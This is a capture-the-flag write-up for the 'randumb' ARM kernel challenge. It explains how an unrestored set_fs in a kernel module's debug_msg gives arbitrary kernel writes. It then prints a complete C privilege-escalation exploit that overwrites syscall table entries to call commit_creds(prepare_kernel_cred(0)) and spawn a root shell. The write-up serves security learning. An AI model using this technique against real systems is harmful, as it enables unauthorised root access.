# randumb (pwn, 250 + 15 pt, solved by 4 teams)
In this challenge, we're given an archive with compressed filesystem, kernel image and script for running an ARM virtual machine.
```sh
drwxrwxr-x aleph/aleph       0 2018-04-09 17:37 ./randumb/
-rwxrwxr-x aleph/aleph     272 2018-04-09 17:37 ./randumb/chall
-rwxrwxr-x aleph/aleph 2310840 2018-04-09 17:35 ./randumb/zImage
-rw-rw-r-- aleph/aleph 1059651 2018-04-09 17:37 ./randumb/rootfs.img.gz
```
After extracting the filesystem we can see `randumb.ko`, which means that we're going to pwn the kernel.

Fortunately, we don't have to reverse the binary as the chall author was nice and provided us with the source code located in `/src`.

Randumb module provides a character device `/dev/randumb` functionally similar to `/dev/urandom` with additional ioctls used for configuration. By setting appropriate config, we can enable debug output which is written to `/tmp/randumb.log`.
The function `debug_msg` looks quite interesting:
```c
static int debug_msg(char *msg, ...) {
        // [...]
        old_fs = get_fs();
        set_fs(KERNEL_DS);

        file = filp_open(DEBUG_FILE, O_WRONLY|O_CREAT|O_APPEND, 0644);

        if (IS_ERR(file))
                return -EINVAL;
        // [....]
}
```
Functions called by `debug_msg` (opening file, writing to file) are normally called from user mode. Thus those functions have to validate pointers passed to them. Otherwise users would be able to leak kernel memory. In order to bypass those checks, `set_fs` is used to increase the `addr_limit` in `thread_info` struct. From this moment, all pointers passed to syscalls either from user or kernel space will be valid.

After doing this, function tries to open `/tmp/randumb.log` file for writing. If opening file fails, function immediately returns. And this is where the vulnerability occurs. Function doesn't restore `old_fs` before returning. If we can trigger this, we would be able to write into arbitrary memory with `read` syscall.

OK, but how to cause an error when trying to open a file? Fortunately, if we try to open a directory file in `O_WRONLY` mode it will return an error, so the only thing we have to do is to create a directory `/tmp/randumb.log`.

To become root, we're going to use standard `commit_creds(prepare_kernel_cred(0))`. To call those functions from userspace we'll overwrite entries in syscall table.

All those things lead us to final exploit:
```c
#include "randumb.h"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

struct settings {
    int charset;
    int debug;
    int debug_time;
    int debug_uid;
};

void* get_symbol(char *symbol){
    FILE *f = fopen("/proc/kallsyms", "r");
    char c;
    char buf[0x100];
    void *addr;

	while (fscanf(f, "%p %c %s\n", &addr, &c, buf) > 0) {
		if (!strcmp(buf, symbol))
			return addr;
	}
	return NULL;
}

int main() {
    // Try to create /tmp/randumb.log directory
    if (mkdir(DEBUG_FILE, 0) < 0) {
        return -1;
    }
    int fd = open("/dev/randumb", O_RDONLY);
    if (fd < 0) {
	    printf("Failed to open");
        return fd;
    }

    struct settings set = {
        .charset = CHARSET_NONE,
        .debug  = DEBUG_ALL,
        .debug_time = DEBUG_ALL,
        .debug_uid = DEBUG_ALL
    };

    // Enable debug mode
    int x = ioctl(fd, IOCTL_SET_SETTINGS, &set);
    if (x < 0) {
	    printf("Unable to set settings");
        return -1;
    }

    void *sys_table = get_symbol("sys_call_table");
    void *prepare = get_symbol("prepare_kernel_cred");
    void *commit = get_symbol("commit_creds");

    printf("sys_call_table %p\n", sys_table);
    printf("prepare_kernel_cred %p\n", prepare);
    printf("commit_kernel_creds %p\n", commit);

    // Make sure that debug_msg is called
    char c;
    int len = read(fd, &c, 1);

    // Use pipe as a way to read data from descriptor
    int fds[2];
    pipe(fds);

    int out = fds[0];
    int in = fds[1];

    write(in, &prepare, 4);
    // Overwrite syscall 100
    read(out, (int*)(sys_table) + 100, 4);

    write(in, &commit, 4);
    // Overwrite syscall 101
    read(out, (int*)(sys_table) + 101, 4);

    // creds = prepare_kernel_cred(0)
    int creds = syscall(100, 0);
    // commit_creds(creds);
    syscall(101, creds);

    if (getuid() != 0) {
        printf("pwn failed!\n");
        return -1;
    }
    printf("pwned\n");

    const char *args[] = {"/bin/sh", NULL};
    execve(args[0], args, NULL);
    return 0;
}
```

The last thing is to compile and run the exploit. Since there's no GCC on the VM itself, we have to compile it locally and send by copy-pasting into the terminal (I recommend gzip and base64 for that).
```bash
arm-linux-gnueabi-gcc pwn.c -static -o pwn
```
This is not an optimal solution since the binary it generates is quite big, but it avoids writing assembly.

Overall this was a really fun challenge and we've got the first blood. ;)
